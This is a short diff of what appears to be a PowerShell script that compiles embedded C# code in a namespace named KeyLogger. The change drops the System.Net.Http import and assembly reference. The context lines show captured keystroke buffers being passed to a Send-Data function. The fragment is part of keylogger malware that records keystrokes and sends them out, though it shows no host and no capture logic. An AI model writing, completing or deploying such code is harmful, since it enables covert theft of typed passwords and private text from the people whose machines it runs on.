@@ -25,7 +25,6 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Windows.Forms;
 using System.Threading;
-using System.Net.Http;
 using System.Management.Automation.Runspaces;
 
 namespace KeyLogger {
@@ -151,7 +150,7 @@ namespace KeyLogger {
     }
 }
 "@
-Add-Type -TypeDefinition $src -ReferencedAssemblies System.Windows.Forms,System.Net.Http
+Add-Type -TypeDefinition $src -ReferencedAssemblies System.Windows.Forms
 [KeyLogger.Program]::Run({
     param($buf)
     Send-Data $buf
